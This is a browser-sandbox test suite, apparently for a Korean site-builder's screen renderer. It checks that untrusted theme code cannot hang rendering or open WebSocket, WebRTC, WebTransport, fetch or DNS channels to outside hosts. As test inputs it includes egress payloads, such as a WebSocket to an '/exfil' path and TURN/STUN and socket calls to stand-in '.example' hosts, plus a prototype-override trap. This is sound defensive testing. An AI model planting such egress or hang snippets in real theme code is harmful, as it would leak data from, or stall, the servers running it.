/**
 * **테마 코드가 도는 그리기 브라우저의 샌드박스 — 실브라우저로 잠근다.** 무엇을 재는지:
 *
 * 1. **`page.evaluate` 는 한도를 안 받는다** — 컨텍스트 기본 한도(`setDefaultTimeout`)도 옵션도 없다. 그래서 렌더러는 `evaluate` 를 전부
 *    `withinLimit` 로 감싼다(`screen-render-chromium.ts`). 한 자리라도 빠지면: 준비 신호 뒤의 `data-wb-failed` 읽기가 그랬듯, 테마 코드가
 *    `getAttribute` 를 끝나지 않는 thenable 로 덮으면 **그 장의 render 가 영영 안 끝나고 배치 전체(멀쩡한 장까지)가 멈춘다** — 그리기 칸을
 *    쥔 채다. 두부 물음의 `evaluate` 도 같은 꼴이라 함께 잰다(물음 페이지는 테마 코드를 안 싣는다 — 호출을 붙잡아 판을 세운다).
 *
 * 2. **요청 가로채기(`context.route`)가 못 보는 채널이 있다** — WebSocket · WebRTC(STUN · TURN) · WebTransport · 공유 워커의 요청 전부.
 *    그것만 두면 테마 코드가 `new WebSocket(…)` · `new RTCPeerConnection({ iceServers })` 로 **테마 작성자가 고른 주소에 실제로
 *    소켓을 연다**(서버의 헤드리스 Chromium 이 바깥으로 나간다). 그래서 두 겹이 막는다(`screen-render-chromium.ts` 머리말 「바깥으로
 *    나가는 요청을 막는다」) — 브라우저 겹(띄우는 인자 · 주)과 페이지 겹(초기화 스크립트 · 보조). 두 겹이 문서에서 겹치므로 격자는 겹 ·
 *    인자를 하나씩 걷은 판을 따로 돌린다(아래 「테마 코드의 소켓」의 표). 여기서는 127.0.0.1 리스너로 «소켓이 열렸다» 를 센다 — 운영에서는
 *    공인 주소다.
 */
import { createServer, type Socket } from 'node:net'
import { createSocket } from 'node:dgram'
import { mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { installCatalog, type PageDocument } from '@wirebound/schema'
import { chromium, type Browser, type BrowserContext, type Page, type Route } from 'playwright-core'
import { describe, expect, it } from 'vitest'
import {
  chromiumScreenRenderer,
  KOREAN_GLYPH_PROBE,
  NO_EGRESS_ARGS,
  NO_SOCKETS_INIT,
  SCREEN_ORIGIN,
} from '../src/services/screen-render-chromium'
import { KOREAN_PROBE_FAILED } from '../src/services/screen-render'
import { readApiEnvFile } from '../test/test-database-url'
import { bundled, inlineTheme, jobOf } from './screen-jobs'

installCatalog()

function screenChromiumPath(): string | undefined {
  const value = process.env.SCREEN_CHROMIUM_PATH ?? readApiEnvFile().SCREEN_CHROMIUM_PATH
  return value === undefined || value === '' ? undefined : value
}
const EXECUTABLE_PATH = screenChromiumPath()
const LAUNCH = EXECUTABLE_PATH === undefined ? {} : { executablePath: EXECUTABLE_PATH }

async function browserLaunches(): Promise<boolean> {
  try {
    const browser = await chromium.launch(LAUNCH)
    await browser.close()
    return true
  } catch {
    return false
  }
}
const 있다 = await browserLaunches()
if (!있다) {
  // eslint-disable-next-line no-console
  console.log('[screen-sandbox-review] Chromium 을 띄우지 못해 건너뛴다 — `screen-chromium.test.ts` 와 같은 넣는 법')
}

/** **렌더러가 쓰는 그 `Page` 클래스** — 같은 `playwright-core` 모듈이다(`Page` 는 값으로 안 내보낸다). 호출 하나를 붙잡는 데 쓴다. */
async function pageClass(): Promise<{ evaluate: Page['evaluate'] }> {
  const probe = await chromium.launch(LAUNCH)
  try {
    return Object.getPrototypeOf(await probe.newPage()) as { evaluate: Page['evaluate'] }
  } finally {
    await probe.close()
  }
}

const doc = (): PageDocument =>
  ({
    version: 1,
    root: { id: 'n_p', type: 'Page', children: [{ id: 'n_t', type: 'Text', props: { content: '한글 본문' } }] },
  }) as unknown as PageDocument

describe.skipIf(!있다)('내보내기 화면 샌드박스', () => {
  /**
   * 테마 코드가 `data-wb-failed` 읽기를 끝나지 않는 Promise 로 바꾼다. render 는 한 장의 한도(2s) 안에 그 장을 **실패**로 끝내고
   * 돌아와야 한다. 그 읽기를 한도 없이 두면 render 가 영영 안 끝난다 — 멀쩡한 둘째 장은 다 그려도 배치가 멈춘다(8s 가드에 `hung`).
   */
  it('준비 뒤 data-wb-failed 읽기가 멈추면 그 장만 실패하고 배치는 한도 안에 끝난다', async () => {
    const trap = inlineTheme({
      id: 'evaluate-trap',
      before: `const g = Element.prototype.getAttribute; Element.prototype.getAttribute = function (n) { return n === 'data-wb-failed' ? new Promise(() => {}) : g.call(this, n) }`,
    })
    const launched: Browser[] = []
    const original = chromium.launch.bind(chromium)
    ;(chromium as unknown as { launch: typeof chromium.launch }).launch = (async (o?: Parameters<typeof chromium.launch>[0]) => {
      const b = await original(o)
      launched.push(b)
      return b
    }) as typeof chromium.launch
    const timeoutMs = 2000
    const rendering = chromiumScreenRenderer({ ...LAUNCH, timeoutMs, concurrency: 2 }).render(
      jobOf(bundled('덫', doc(), trap), bundled('멀쩡', doc())),
    )
    let verdict: 'hung' | 'returned' = 'hung'
    try {
      // 배치가 한 장의 한도의 네 배(8s) 안에 끝나야 한다. 안 끝나면 결함이다.
      const got = await Promise.race([
        rendering.then((batch) => ({ batch })),
        new Promise<'guard'>((r) => setTimeout(() => r('guard'), timeoutMs * 4)),
      ])
      if (got !== 'guard') {
        verdict = 'returned'
        const reasons = got.batch.results.map((x) => (x.ok ? 'ok' : x.reason))
        expect(reasons[0]).toContain('준비되지 않았습니다')
      }
    } finally {
      ;(chromium as unknown as { launch: typeof chromium.launch }).launch = original
      for (const b of launched.splice(0)) await b.close().catch(() => {})
      rendering.catch(() => {})
    }
    expect(verdict).toBe('returned')
  }, 30_000)

  /**
   * 두부 물음의 `evaluate` 도 한도 안이다 — 물음 페이지는 테마 코드를 안 싣지만 `evaluate` 는 한도를 안 받으므로 브라우저가 답하지 않으면
   * 배치가 멈춘다. 그 호출을 끝나지 않게 만든 판(`Page.prototype.evaluate` 를 감쌈)에서 render 가 «못 물었다»로 돌아와야 한다.
   */
  it('두부 물음이 답하지 않으면 한도 안에 «못 물었다»로 돌아온다', async () => {
    const proto = await pageClass()
    const original = proto.evaluate
    let held = 0
    proto.evaluate = function (this: Page, expression: unknown, arg?: unknown) {
      if (expression === KOREAN_GLYPH_PROBE) {
        held += 1
        return new Promise(() => {})
      }
      return original.call(this, expression as string, arg)
    } as Page['evaluate']
    const timeoutMs = 1500
    const rendering = chromiumScreenRenderer({ ...LAUNCH, timeoutMs }).render(jobOf(bundled('멀쩡', doc())))
    rendering.catch(() => {})
    let got: Awaited<typeof rendering> | 'guard'
    try {
      got = await Promise.race([rendering, new Promise<'guard'>((r) => setTimeout(() => r('guard'), timeoutMs * 4))])
    } finally {
      proto.evaluate = original
    }
    expect(held).toBe(1)
    expect(got === 'guard' ? 'guard' : got.results.map((x) => (x.ok ? 'ok' : x.reason))).toEqual([
      `${KOREAN_PROBE_FAILED}: ${timeoutMs}ms 안에 답이 없습니다`,
    ])
  }, 30_000)

  /**
   * 테마 코드가 WebSocket · WebRTC(STUN · TURN)를 127.0.0.1 리스너로 연다. 어느 소켓도 리스너에 닿지 않아야
   * 한다. **이 케이스는 두 겹을 다 떼야 죽는다**(그때 `{ tcp: 2, udp: 1 }`) — 겹마다의 하중은 「테마 코드의 소켓」의 격자가 잰다.
   */
  it('테마 코드의 WebSocket · WebRTC 는 바깥으로 소켓을 열지 못한다', async () => {
    const tcpHits: number[] = []
    const tcp = createServer((s: Socket) => {
      tcpHits.push(1)
      s.destroy()
    })
    tcp.on('error', () => {})
    await new Promise<void>((r) => tcp.listen(0, '127.0.0.1', r))
    const wsPort = (tcp.address() as { port: number }).port
    const turn = createServer((s: Socket) => {
      tcpHits.push(1)
      s.destroy()
    })
    turn.on('error', () => {})
    await new Promise<void>((r) => turn.listen(0, '127.0.0.1', r))
    const turnPort = (turn.address() as { port: number }).port
    const udpHits: number[] = []
    const udp = createSocket('udp4')
    udp.on('message', () => udpHits.push(1))
    await new Promise<void>((r) => udp.bind(0, '127.0.0.1', r))
    const stunPort = (udp.address() as { port: number }).port

    const before = [
      `try { new WebSocket('wss://127.0.0.1:${wsPort}/exfil') } catch (e) {}`,
      `try { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${stunPort}' }, { urls: 'turn:127.0.0.1:${turnPort}?transport=tcp', username: 'u', credential: 'c' }] }); pc.createDataChannel('x'); pc.createOffer().then((o) => pc.setLocalDescription(o)) } catch (e) {}`,
    ].join('; ')
    try {
      const batch = await chromiumScreenRenderer({ ...LAUNCH, timeoutMs: 6000, concurrency: 1 }).render(
        jobOf(bundled('바깥 채널', doc(), inlineTheme({ id: 'net-channels', before }))),
      )
      // 그 장은 그려진다(차단이 온전하면 채널이 열리기만 실패). 늦은 소켓까지 본다.
      await new Promise((r) => setTimeout(r, 2500))
      expect(batch.results[0]?.ok).toBe(true)
      expect({ tcp: tcpHits.length, udp: udpHits.length }).toEqual({ tcp: 0, udp: 0 })
    } finally {
      tcp.close()
      turn.close()
      udp.close()
    }
  }, 40_000)
})

/**
 * **판 — 렌더러를 그대로 부르되 겹 하나를 걷는다.** 두 겹이 문서에서 겹치므로(`screen-render-chromium.ts` 머리말) 온전한 판만 재면 한 겹을
 * 떼도 초록이다. 그래서 소스를 안 바꾸고 판마다 걷는다: 띄우는 인자에서 `strip` 을 빼고(`chromium.launch` 를 감쌈), 페이지 겹의 초기화
 * 스크립트를 안 싣는다(`BrowserContext.addInitScript` 를 감쌈). 걷은 수를 값으로 센다 — 인자 글자가 바뀌어 아무것도 안 걷히면 «겹 없는 판»이
 * 온전한 판을 잰다.
 *
 * 판에 늘 더하는 것 둘:
 * - `--disable-features=LocalNetworkAccessChecks` — 가짜 origin(공개 주소 공간)에서 루프백으로 가는 WebTransport 를 Chromium 이 스스로
 *   막는다(`ERR_BLOCKED_BY_LOCAL_NETWORK_ACCESS_CHECKS`). 운영의 대상은 공인 주소라 그 검사가 안 선다 — 루프백 리스너가 공인 주소를 대신하게
 *   끈다. 끄지 않으면 WebTransport 는 겹 없이도 0 이라 재는 척만 한다.
 * - 가짜 origin 의 문서를 연 컨텍스트는 닫기 전에 `CLOSE_HOLD_MS` 를 기다린다 — 렌더러는 찍자마자 닫으므로 늦게 여는 소켓(ICE 모으기 뒤의
 *   TURN)이 닫힘에 잘려 «안 열렸다»로 읽힌다.
 */
interface Harness {
  /** 띄우는 인자에서 뺄 것(`NO_EGRESS_ARGS` 의 원소). */
  strip?: readonly string[]
  /** 페이지 겹(`NO_SOCKETS_INIT`)을 안 싣는다. */
  dropPageLayer?: boolean
  /** NetLog 를 쓸 파일. */
  netLog?: string
}

const CLOSE_HOLD_MS = 2500

async function contextClass(): Promise<{ addInitScript: BrowserContext['addInitScript']; close: BrowserContext['close'] }> {
  const probe = await chromium.launch(LAUNCH)
  try {
    return Object.getPrototypeOf(await probe.newContext()) as {
      addInitScript: BrowserContext['addInitScript']
      close: BrowserContext['close']
    }
  } finally {
    await probe.close()
  }
}

async function routeClass(): Promise<{ abort: Route['abort'] }> {
  const probe = await chromium.launch(LAUNCH)
  try {
    const context = await probe.newContext()
    let proto: { abort: Route['abort'] } | undefined
    await context.route('**/*', (route) => {
      proto ??= Object.getPrototypeOf(route) as { abort: Route['abort'] }
      void route.fulfill({ status: 200, contentType: 'text/html', body: '' })
    })
    await (await context.newPage()).goto('https://route.invalid/')
    if (proto === undefined) throw new Error('Route 를 못 붙잡았다')
    return proto
  } finally {
    await probe.close()
  }
}

/** `harness` 로 걷은 판에서 `job` 을 그린다. 그린 결과 · 걷은 수 · 가로채기가 끊은 주소를 낸다. */
async function drawWith(harness: Harness, job: ReturnType<typeof jobOf>, timeoutMs = 6000) {
  const strip = harness.strip ?? []
  const counts = { stripped: 0, dropped: 0 }
  const aborted: string[] = []
  const originalLaunch = chromium.launch.bind(chromium)
  ;(chromium as unknown as { launch: typeof chromium.launch }).launch = ((options?: Parameters<typeof chromium.launch>[0]) => {
    const args = (options?.args ?? []).filter((arg) => {
      const hit = strip.includes(arg)
      if (hit) counts.stripped += 1
      return !hit
    })
    args.push('--disable-features=LocalNetworkAccessChecks')
    if (harness.netLog !== undefined) args.push(`--log-net-log=${harness.netLog}`)
    return originalLaunch({ ...options, args })
  }) as typeof chromium.launch
  const contextProto = await contextClass()
  const originalInit = contextProto.addInitScript
  const originalClose = contextProto.close
  contextProto.addInitScript = function (this: BrowserContext, script, arg) {
    if (
      harness.dropPageLayer === true &&
      typeof script === 'object' &&
      script !== null &&
      'content' in script &&
      script.content === NO_SOCKETS_INIT
    ) {
      counts.dropped += 1
      return Promise.resolve()
    }
    return originalInit.call(this, script as never, arg)
  } as BrowserContext['addInitScript']
  contextProto.close = async function (this: BrowserContext, options) {
    if (this.pages().some((page) => page.url().startsWith(SCREEN_ORIGIN))) await new Promise((r) => setTimeout(r, CLOSE_HOLD_MS))
    return originalClose.call(this, options)
  } as BrowserContext['close']
  const routeProto = await routeClass()
  const originalAbort = routeProto.abort
  routeProto.abort = function (this: Route, code) {
    aborted.push(this.request().url())
    return originalAbort.call(this, code)
  }
  try {
    const batch = await chromiumScreenRenderer({ ...LAUNCH, timeoutMs, concurrency: 1 }).render(job)
    return { batch, ...counts, aborted }
  } finally {
    ;(chromium as unknown as { launch: typeof chromium.launch }).launch = originalLaunch
    contextProto.addInitScript = originalInit
    contextProto.close = originalClose
    routeProto.abort = originalAbort
  }
}

/** 브라우저 겹의 인자 넷 — 판이 무엇을 걷는지 이름으로 적는다. */
const [PROXY_SERVER, PROXY_LOOPBACK, WEBRTC_POLICY, HOST_RULES] = NO_EGRESS_ARGS
const EVERY_BROWSER_ARG = [...NO_EGRESS_ARGS]

/**
 * **격자 — 채널 × 자리 × 주소 꼴.** 자리마다 테마 코드가 그 채널을 연다: 최상위 문서 · about:blank iframe · `window.open` 창 · 전용 워커 ·
 * 공유 워커. 주소는 IP 리터럴(`127.0.0.1`)과 이름(`wbprobe.localhost` — 루프백으로 풀리는 이름. 운영에서는 DNS 이름이다). 칸마다 제
 * 포트의 리스너를 두고 **실제로 소켓이 열렸는지**를 센다.
 *
 * 칸은 **겹 없는 판에서 소켓을 여는 것만** 둔다(그 판이 카나리아다 — 아래 «겹 없음»). 빠진 것: 문서 · 전용 워커의 fetch · EventSource 는
 * 요청 가로채기가 끊는다(`screen-chromium.test.ts` 「일곱 길」이 잰다) · 워커에는 RTCPeerConnection 이 없다 · WebTransport 는 이름으로는 겹 없이도
 * 안 나갔다. 공유 워커의 fetch · EventSource 는 가로채기가 못 봐 칸에 든다.
 */
type Proto = 'tcp' | 'udp'
const RTC = (servers: string) =>
  `const pc = new RTCPeerConnection({ iceServers: [${servers}] }); pc.createDataChannel('x'); pc.createOffer().then((o) => pc.setLocalDescription(o))`
const CHANNELS: Record<string, { proto: Proto; open: (host: string, port: number) => string }> = {
  ws: { proto: 'tcp', open: (h, p) => `new WebSocket('wss://${h}:${p}/x')` },
  wt: { proto: 'udp', open: (h, p) => `new WebTransport('https://${h}:${p}/x').ready.catch(() => {})` },
  stun: { proto: 'udp', open: (h, p) => RTC(`{ urls: 'stun:${h}:${p}' }`) },
  turnTcp: { proto: 'tcp', open: (h, p) => RTC(`{ urls: 'turn:${h}:${p}?transport=tcp', username: 'u', credential: 'c' }`) },
  turnUdp: { proto: 'udp', open: (h, p) => RTC(`{ urls: 'turn:${h}:${p}', username: 'u', credential: 'c' }`) },
  sse: { proto: 'tcp', open: (h, p) => `new EventSource('http://${h}:${p}/x')` },
  fetch: { proto: 'tcp', open: (h, p) => `fetch('http://${h}:${p}/x').catch(() => {})` },
}
const HOSTS = { ip: '127.0.0.1', name: 'wbprobe.localhost' } as const
const DOCUMENTS = ['top', 'iframe', 'popup'] as const
const WORKERS = ['worker', 'shared'] as const
type Place = (typeof DOCUMENTS)[number] | (typeof WORKERS)[number]
const GRID: { channel: string; place: Place; form: keyof typeof HOSTS }[] = [
  ...DOCUMENTS.flatMap((place) => [
    ...['ws', 'stun', 'turnTcp', 'turnUdp'].flatMap((channel) => (['ip', 'name'] as const).map((form) => ({ channel, place, form }))),
    { channel: 'wt', place, form: 'ip' as const },
  ]),
  ...WORKERS.flatMap((place) => [
    ...(place === 'shared' ? ['ws', 'sse', 'fetch'] : ['ws']).flatMap((channel) =>
      (['ip', 'name'] as const).map((form) => ({ channel, place, form })),
    ),
    { channel: 'wt', place, form: 'ip' as const },
  ]),
]
const key = (cell: (typeof GRID)[number]) => `${cell.channel}/${cell.place}/${cell.form}`
const ALL = GRID.map(key).sort()
const IN_WORKERS = GRID.filter((cell) => cell.place === 'worker' || cell.place === 'shared')
  .map(key)
  .sort()

/** 테마 코드 한 조각을 그 자리에서 돌린다. */
function placed(place: Place, code: string): string {
  const quoted = JSON.stringify(`try { ${code} } catch (e) {}`)
  switch (place) {
    case 'top':
      return `try { ${code} } catch (e) {}`
    case 'iframe':
      return `{ const f = document.createElement('iframe'); document.documentElement.appendChild(f); f.contentWindow.eval(${quoted}) }`
    case 'popup':
      return `{ const w = window.open(''); w.eval(${quoted}) }`
    case 'worker':
      return `new Worker(URL.createObjectURL(new Blob([${quoted}], { type: 'text/javascript' })))`
    case 'shared':
      return `new SharedWorker(URL.createObjectURL(new Blob([${quoted}], { type: 'text/javascript' })))`
  }
}

/** 격자의 리스너를 세우고, 그 칸들을 여는 테마 코드와 열린 칸을 읽는 함수를 낸다. */
async function gridListeners() {
  const hits = new Set<string>()
  const closers: (() => void)[] = []
  const ports: number[] = []
  const code: string[] = []
  for (const cell of GRID) {
    const name = key(cell)
    let port: number
    if (CHANNELS[cell.channel]!.proto === 'tcp') {
      const server = createServer((socket: Socket) => {
        hits.add(name)
        socket.destroy()
      })
      server.on('error', () => {})
      await new Promise<void>((r) => server.listen(0, '127.0.0.1', r))
      port = (server.address() as { port: number }).port
      closers.push(() => server.close())
    } else {
      const socket = createSocket('udp4')
      socket.on('message', () => hits.add(name))
      await new Promise<void>((r) => socket.bind(0, '127.0.0.1', r))
      port = socket.address().port
      closers.push(() => socket.close())
    }
    ports.push(port)
    code.push(placed(cell.place, CHANNELS[cell.channel]!.open(HOSTS[cell.form], port)))
  }
  return {
    before: code.map((line) => `try { ${line} } catch (e) {}`).join(';\n'),
    opened: () => [...hits].sort(),
    ports,
    close: () => closers.forEach((close) => close()),
  }
}

describe.skipIf(!있다)('테마 코드의 소켓 — 브라우저 겹(주) · 페이지 겹(보조)', () => {
  /**
   * 판마다 같은 테마 코드로 격자를 연다. **온전한 판은 0** 이고, 한 겹 · 한 인자를 걷은 판도 0 이어야 한다 — 그래야 그 겹 · 인자가 없어도
   * 나머지가 막는다는 것이 서고, 거꾸로 **그 판에서 무엇을 뗀 변조가 죽는지**가 그 겹의 하중이다:
   *
   * | 판 | 기대 | 혼자 죽이는 변조 |
   * |---|---|---|
   * | 온전 | 0 | (두 겹을 다 떼야) |
   * | 페이지 겹 없이 | 0 | WebRTC 인자를 뗌 — 문서의 STUN · TURN(UDP) |
   * | 페이지 겹 · 프록시 없이 | 0 | 이름 풀이 막기를 뗌 |
   * | 페이지 겹 · 이름 풀이 막기 없이 | 0 | 프록시 · 루프백 규칙을 뗌 |
   * | 브라우저 겹 없이 | **워커의 칸만** | 페이지 겹을 뗌 — 문서의 칸까지 열린다 |
   * | 겹 없음(카나리아) | **칸 전부** · 가로채기는 한 칸도 못 봄 | 리스너 · 판이 재지 못하면 여기서 죽는다 |
   */
  it.each([
    { name: '온전', harness: {}, expected: [] as string[], stripped: 0, dropped: 0 },
    { name: '페이지 겹 없이', harness: { dropPageLayer: true }, expected: [], stripped: 0, dropped: 1 },
    {
      name: '페이지 겹 · 프록시 없이',
      harness: { dropPageLayer: true, strip: [PROXY_SERVER!, PROXY_LOOPBACK!] },
      expected: [],
      stripped: 2,
      dropped: 1,
    },
    {
      name: '페이지 겹 · 이름 풀이 막기 없이',
      harness: { dropPageLayer: true, strip: [HOST_RULES!] },
      expected: [],
      stripped: 1,
      dropped: 1,
    },
    { name: '브라우저 겹 없이', harness: { strip: EVERY_BROWSER_ARG }, expected: IN_WORKERS, stripped: 4, dropped: 0 },
    { name: '겹 없음(카나리아)', harness: { dropPageLayer: true, strip: EVERY_BROWSER_ARG }, expected: ALL, stripped: 4, dropped: 1 },
  ])(
    '격자 — $name',
    async ({ harness, expected, stripped, dropped }) => {
      const grid = await gridListeners()
      try {
        const run = await drawWith(harness, jobOf(bundled('grid', doc(), inlineTheme({ id: 'socket-grid', before: grid.before }))))
        expect(run.batch.results.map((result) => (result.ok ? 'ok' : result.reason))).toEqual(['ok'])
        expect({ stripped: run.stripped, dropped: run.dropped }).toEqual({ stripped, dropped })
        expect(grid.opened()).toEqual(expected)
        // 이 칸들은 요청 가로채기가 못 보는 길이다 — 끊은 주소에 격자의 포트가 하나도 없다.
        expect(run.aborted.filter((url) => grid.ports.some((port) => url.includes(`:${port}/`)))).toEqual([])
      } finally {
        grid.close()
      }
    },
    60_000,
  )

  /**
   * **페이지 겹은 문서마다 선다** — 최상위 · about:blank iframe · `window.open` 창에서 소켓 생성자 다섯이 없다. 테마 코드가 남은 것을
   * `data-wb-failed` 로 말한다(렌더러가 그 까닭으로 그 장을 실패시킨다). 격자는 이 겹을 떼도 초록이므로(브라우저 겹이 막는다) 이 겹이 섰는지는
   * 여기서 잰다. 페이지 겹을 걷은 판이 카나리아다 — 알리는 길이 서는지.
   */
  const NAMES = ['WebSocket', 'WebTransport', 'RTCPeerConnection', 'webkitRTCPeerConnection', 'EventSource']
  const report = [
    `const names = ${JSON.stringify(NAMES)}`,
    `const seen = []`,
    `const check = (w, where) => { for (const n of names) if (typeof w[n] !== 'undefined') seen.push(where + ':' + n) }`,
    `check(window, 'top')`,
    `{ const f = document.createElement('iframe'); document.documentElement.appendChild(f); check(f.contentWindow, 'iframe') }`,
    `{ const w = window.open(''); if (w) check(w, 'popup'); else seen.push('popup:열리지 않음') }`,
    `if (seen.length > 0) document.documentElement.setAttribute('data-wb-failed', '소켓 생성자: ' + seen.join(' '))`,
  ].join('; ')
  it.each([
    { name: '온전', harness: {}, expected: 'ok' },
    {
      name: '페이지 겹 없이(카나리아)',
      harness: { dropPageLayer: true },
      expected: `소켓 생성자: ${DOCUMENTS.flatMap((where) => NAMES.map((n) => `${where}:${n}`)).join(' ')}`,
    },
  ])(
    '페이지 겹이 문서 · iframe · 창에서 생성자를 지운다 — $name',
    async ({ harness, expected }) => {
      const run = await drawWith(harness, jobOf(bundled('page-layer', doc(), inlineTheme({ id: 'page-layer', before: report }))))
      expect(run.batch.results.map((result) => (result.ok ? 'ok' : result.reason))).toEqual([expected])
    },
    60_000,
  )

  /**
   * **테마 코드가 고른 이름을 브라우저가 풀지 않는다** — 소켓이 안 열려도 이름을 푸는 것 자체가 바깥으로 나가는 DNS 질의다(이름에 실은
   * 글자가 그 이름의 권한 서버에 닿는다). NetLog 의 이름 풀이 사건(`HOST_RESOLVER_*`)에 테마가 고른 이름이 하나도 없어야 한다. 이름
   * 풀이 막기를 걷은 판에서는 프록시가 있어도 공유 워커의 fetch 이름을 풀려 들었다(잰 값) — 이 케이스가 그 인자의 하중이다. 겹 없는 판이
   * 카나리아다.
   */
  const DNS_BEFORE = [
    `new WebSocket('wss://wbdns-ws.example/x')`,
    RTC(`{ urls: 'turn:wbdns-turn.example:3478?transport=tcp', username: 'u', credential: 'c' }`),
    `new SharedWorker(URL.createObjectURL(new Blob(["new WebSocket('wss://wbdns-sharedws.example/x'); fetch('https://wbdns-sharedfetch.example/x').catch(() => {})"], { type: 'text/javascript' })))`,
    `new Worker(URL.createObjectURL(new Blob(["new WebSocket('wss://wbdns-workerws.example/x')"], { type: 'text/javascript' })))`,
  ]
    .map((line) => `try { ${line} } catch (e) {}`)
    .join(';\n')
  it.each([
    { name: '온전', harness: {} as Harness, expected: (names: string[]) => expect(names).toEqual([]) },
    {
      name: '겹 없음(카나리아)',
      harness: { dropPageLayer: true, strip: EVERY_BROWSER_ARG } as Harness,
      expected: (names: string[]) => expect(names).toEqual(expect.arrayContaining(['sharedfetch', 'sharedws', 'workerws', 'ws'])),
    },
  ])(
    '테마 코드가 고른 이름을 풀지 않는다(NetLog) — $name',
    async ({ harness, expected }) => {
      const dir = mkdtempSync(join(tmpdir(), 'wb-netlog-'))
      try {
        const netLog = join(dir, 'net.json')
        const run = await drawWith({ ...harness, netLog }, jobOf(bundled('dns', doc(), inlineTheme({ id: 'dns', before: DNS_BEFORE }))))
        expect(run.batch.results.map((result) => (result.ok ? 'ok' : result.reason))).toEqual(['ok'])
        const log = JSON.parse(readFileSync(netLog, 'utf8')) as {
          constants: { logEventTypes: Record<string, number> }
          events: { type: number; params?: unknown }[]
        }
        const types = new Map(Object.entries(log.constants.logEventTypes).map(([name, id]) => [id, name]))
        const resolverEvents = log.events.filter((event) => types.get(event.type)?.startsWith('HOST_RESOLVER'))
        // 판이 NetLog 를 읽고 있다 — 이름 풀이 사건 자체가 0 이면 쓰는 길이 끊긴 것이다(가짜 origin 도 풀지 않으므로 온전한 판의 사건 수가 적다).
        expect(log.events.length).toBeGreaterThan(0)
        const names = [
          ...new Set(
            resolverEvents.flatMap((event) =>
              [...JSON.stringify(event.params ?? {}).matchAll(/wbdns-([a-z]+)\.example/g)].map((m) => m[1]!),
            ),
          ),
        ].sort()
        expected(names)
      } finally {
        rmSync(dir, { recursive: true, force: true })
      }
    },
    60_000,
  )
})
